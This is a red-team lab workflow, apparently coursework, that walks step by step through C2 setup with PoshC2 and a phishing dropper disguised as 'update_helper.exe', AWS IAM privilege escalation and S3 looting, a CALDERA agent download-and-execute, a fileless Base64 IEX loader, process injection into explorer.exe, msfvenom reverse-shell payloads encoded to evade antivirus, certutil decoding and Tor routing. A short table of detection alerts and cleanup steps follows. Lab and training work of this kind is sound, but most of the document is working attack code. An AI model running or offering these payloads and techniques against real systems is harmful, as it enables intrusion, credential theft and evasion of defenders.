# Week 4 — Step-by-Step Lab Workflow

> All steps performed in an isolated VMware + AWS CloudGoat lab environment.

---

## Phase 1 — C2 Infrastructure Setup

### Step 1.1 — Install & Configure PoshC2

```bash
# Install PoshC2
sudo apt install -y poshc2 || \
  curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/install.sh | bash

# Create new project
posh-project -n week4_lab

# Edit project settings
nano /opt/poshc2/projects/week4_lab/config.yml
# Set:
#   PayloadCommsHost: https://192.168.1.50
#   DefaultBeaconTime: 5
#   Jitter: 20
#   KillDate: 2026-05-01

# Start C2 server
posh -s /opt/poshc2/projects/week4_lab/config.yml
```

### Step 1.2 — Generate Payloads

```bash
# Stageless PowerShell implant
posh-implant -type ps \
  -host https://192.168.1.50 \
  -kill-date 2026-05-01 \
  -output implant.ps1

# Dropper EXE
posh-implant -type dropper \
  -host https://192.168.1.50 \
  -output update_helper.exe

# Deliver via phishing email attachment or web drop
```

### Step 1.3 — Manage Sessions

```bash
# In PoshC2 handler — interact with session
posh > tasks --new --session SID001
posh > run-exe Core.Program Core whoami /all
posh > run-exe Core.Program Core ipconfig /all
posh > run-exe Core.Program Core net user

# Download file from target
posh > download C:\Users\john.doe\Documents\sensitive.docx

# Upload file to target
posh > upload /home/kali/tools/winpeas.exe C:\Windows\Temp\winpeas.exe
```

---

## Phase 2 — Cloud Attack Lab

### Step 2.1 — Setup CloudGoat

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r requirements.txt
./cloudgoat.py config profile YOUR_ADMIN_PROFILE

# Deploy IAM privilege escalation scenario
./cloudgoat.py create iam_privesc_by_attachment
```

### Step 2.2 — Install and Run Pacu

```bash
pip3 install pacu
pacu

# Set credentials from CloudGoat output
> import_keys --profile cloudgoat-dev

# Enumerate everything
> run s3__bucket_finder
> run iam__enum_permissions
> run iam__privesc_scan
> run ec2__enum
> run cloudtrail__enum
```

### Step 2.3 — S3 Enumeration & Data Access

```bash
# List buckets
aws s3 ls --profile cloudgoat-dev

# Check bucket ACL
aws s3api get-bucket-acl --bucket TARGET-BUCKET --profile cloudgoat-dev

# Download sensitive files
aws s3 sync s3://TARGET-BUCKET ./loot/ --profile cloudgoat-dev

# Check for credentials
cat ./loot/credentials.json
```

### Step 2.4 — IAM Privilege Escalation

```bash
# Check current permissions
aws iam get-user --profile cloudgoat-dev
aws iam list-attached-user-policies --user-name dev-intern --profile cloudgoat-dev

# Escalation via Lambda PassRole
# 1. Create trust policy
cat > trust.json << 'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
  "Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}
EOF

# 2. Create role and attach admin
aws iam create-role --role-name escalator-role \
  --assume-role-policy-document file://trust.json --profile cloudgoat-dev
aws iam attach-role-policy --role-name escalator-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile cloudgoat-dev

# 3. Create Lambda function
aws lambda create-function --function-name escalator \
  --runtime python3.9 --handler index.handler \
  --role arn:aws:iam::ACCOUNT_ID:role/escalator-role \
  --zip-file fileb://function.zip --profile cloudgoat-dev

# 4. Invoke Lambda to retrieve credentials
aws lambda invoke --function-name escalator out.json --profile cloudgoat-dev
cat out.json  # Contains temporary admin credentials
```

### Step 2.5 — ScoutSuite Audit

```bash
pip3 install scoutsuite
scout aws --profile cloudgoat-dev --report-dir ./scoutsuite-report
firefox ./scoutsuite-report/scoutsuite-report.html

# CLI audit script
python3 Scripts/cloud_enum.py --profile cloudgoat-dev --region us-east-1
```

---

## Phase 3 — Adversary Emulation (APT29)

### Step 3.1 — Setup CALDERA

```bash
# Install CALDERA
git clone https://github.com/mitre/caldera.git --depth 1
cd caldera && pip3 install -r requirements/requirements.txt
python3 server.py --insecure

# Access web UI: http://localhost:8888
# Default creds: admin/admin
```

### Step 3.2 — Configure APT29 Operation

```
In CALDERA UI:
1. Go to Operations → New Operation
2. Select Adversary: APT29 (or import from MITRE ATT&CK)
3. Set Planner: Atomic
4. Assign agents to group: week4-targets
5. Click Start
```

### Step 3.3 — Deploy CALDERA Agent

```powershell
# On Windows victim — deploy agent via PowerShell
$url="http://192.168.1.50:8888/file/download"
$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data=$wc.DownloadData($url)
Get-Process -Name "sandcat" -ErrorAction SilentlyContinue | Stop-Process
[System.IO.File]::WriteAllBytes("C:\Users\Public\sandcat.exe",$data)
Start-Process -FilePath C:\Users\Public\sandcat.exe `
  -ArgumentList "-server http://192.168.1.50:8888 -group week4-targets"
```

---

## Phase 4 — Living-Off-the-Land & Evasion

### Step 4.1 — PowerShell Fileless Execution

```powershell
# Encode beacon in Base64
$content = Get-Content implant.ps1 -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
$encoded = [System.Convert]::ToBase64String($bytes)

# Execute entirely in memory — no file on disk
IEX ([System.Text.Encoding]::Unicode.GetString(
  [System.Convert]::FromBase64String($encoded)))
```

### Step 4.2 — Process Injection

```powershell
# Inject into explorer.exe (T1055)
$pid = (Get-Process explorer).Id
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")] public static extern IntPtr OpenProcess(int a,bool b,int c);
  [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr a,int s,int t,int p);
  [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,int s,out int w);
  [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr id);
}
"@
$handle = [Win32]::OpenProcess(0x1F0FFF, $false, $pid)
$addr   = [Win32]::VirtualAllocEx($handle, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[Win32]::WriteProcessMemory($handle, $addr, $shellcode, $shellcode.Length, [ref]0)
[Win32]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
```

### Step 4.3 — msfvenom Payload Encoding

```bash
# Baseline (no encoding)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe -o baseline.exe

# Encoded ×5 iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded.exe

# LOLBIN delivery via certutil (0 AV detections)
base64 encoded.exe > payload.b64
# On target:
certutil -decode payload.b64 payload.exe
```

### Step 4.4 — Tor C2 Routing

```bash
# Install Tor
sudo apt install -y tor
sudo service tor start

# Configure proxychains
sudo nano /etc/proxychains4.conf
# Ensure: socks5 127.0.0.1 9050

# Route all traffic through Tor
proxychains msfconsole
proxychains curl https://api.ipify.org  # Verify IP masked
```

---

## Phase 5 — Blue Team Detection Analysis

### Wazuh Alerts Generated

| Time | Rule | Severity | Event |
|------|------|----------|-------|
| 09:02 | 92219 | CRITICAL | LSASS access (Mimikatz) |
| 09:08 | 60010 | HIGH | Scheduled task created |
| 09:14 | 5763 | HIGH | SSH brute force |
| 09:21 | 18104 | HIGH | ADMIN$ share write |
| 09:27 | 82500 | MEDIUM | Anomalous DNS (64-char labels) |
| 09:41 | 5501 | HIGH | Root login new IP |
| 09:48 | 31101 | MEDIUM | Registry Run key added |
| 09:55 | 92301 | CRITICAL | PowerShell encoded command |
| 10:02 | 40205 | HIGH | WMI subscription created |

**Undetected:** certutil LOLBIN decode, DNS tunnelling data exfiltration

---

## Cleanup

```bash
# AWS — destroy CloudGoat scenario
cd cloudgoat
./cloudgoat.py destroy iam_privesc_by_attachment

# Remove C2 implants from Windows targets
posh > tasks --new --session SID001
posh > run-exe Core.Program Core del C:\Windows\Temp\update_helper.exe

# Remove persistence
posh > run-exe Core.Program Core schtasks /Delete /TN WindowsUpdateHelper /F
posh > run-exe Core.Program Core reg delete "HKCU\...\Run" /v WindowsUpdateHelper /f

# Terminate sessions
posh > exit-session SID001
posh > exit-session SID002
posh > exit-session SID003
```
